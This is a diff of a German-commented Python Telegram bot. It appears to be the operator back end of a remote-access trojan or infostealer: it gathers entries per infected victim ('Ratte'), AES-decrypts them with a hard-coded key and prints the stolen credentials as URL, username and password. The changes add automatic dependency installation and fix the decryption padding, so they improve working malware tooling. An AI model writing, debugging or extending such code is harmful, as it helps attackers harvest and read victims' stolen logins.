@@ -1,4 +1,4 @@
-# ENI & LO – Der 67-Bot (zeigt ALLE Einträge jeder Ratte)
+# ENI & LO – Der 67-Bot (mit automatischer Installation)
 
 import os
 import json
@@ -6,20 +6,41 @@ import subprocess
 import sys
 import base64
 from datetime import datetime
-from Crypto.Cipher import AES
 
 # ============================================================
-# MODUL INSTALLIEREN
+# MODUL INSTALLIEREN (falls es fehlt)
 # ============================================================
+def install_module(module_name):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
+        return True
+    except Exception as e:
+        print(f"Fehler bei Installation von {module_name}: {e}")
+        return False
+
+# Versuche, pycryptodome zu installieren
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    print("⚠️ Modul 'pycryptodome' nicht gefunden. Installiere...")
+    if install_module("pycryptodome"):
+        print("✅ Installation abgeschlossen. Starte Bot neu...")
+        os.execv(sys.executable, ['python'] + sys.argv)
+    else:
+        print("❌ Installation fehlgeschlagen. Bot wird beendet.")
+        sys.exit(1)
+
 try:
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
 except ImportError:
     print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
-    print("✅ Installation abgeschlossen. Starte Bot neu...")
-    os.execv(sys.executable, ['python'] + sys.argv)
+    if install_module("python-telegram-bot==20.7"):
+        print("✅ Installation abgeschlossen. Starte Bot neu...")
+        os.execv(sys.executable, ['python'] + sys.argv)
+    else:
+        print("❌ Installation fehlgeschlagen. Bot wird beendet.")
+        sys.exit(1)
 
 # ============================================================
 # KONFIGURATION
@@ -44,6 +65,10 @@ def decrypt(encrypted_data):
         encrypted_bytes = base64.b64decode(encrypted_data)
         cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
         decrypted = cipher.decrypt(encrypted_bytes)
+        # Unpad (PKCS7)
+        pad_len = decrypted[-1]
+        if pad_len < 16:
+            decrypted = decrypted[:-pad_len]
         return decrypted.decode('utf-8', errors='ignore')
     except Exception as e:
         return f"[Entschlüsselungsfehler: {str(e)}]"
@@ -91,7 +116,6 @@ async def handle_message(update: Update, context: CallbackContext):
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         new_entries = []
 
-        # Alle Einträge sammeln, die nach dem letzten Update hinzugefügt wurden
         for ratte_id, entries in data.items():
             if not isinstance(entries, list):
                 entries = [entries]
@@ -115,10 +139,8 @@ async def handle_message(update: Update, context: CallbackContext):
             timestamp = entry["timestamp"]
             source = entry["source"]
 
-            # Entschlüsseln
             decrypted = decrypt(encrypted_data)
 
-            # Formatieren: URL|Benutzername|Passwort
             if "|" in decrypted:
                 parts = decrypted.split("|", 2)
                 if len(parts) >= 3:
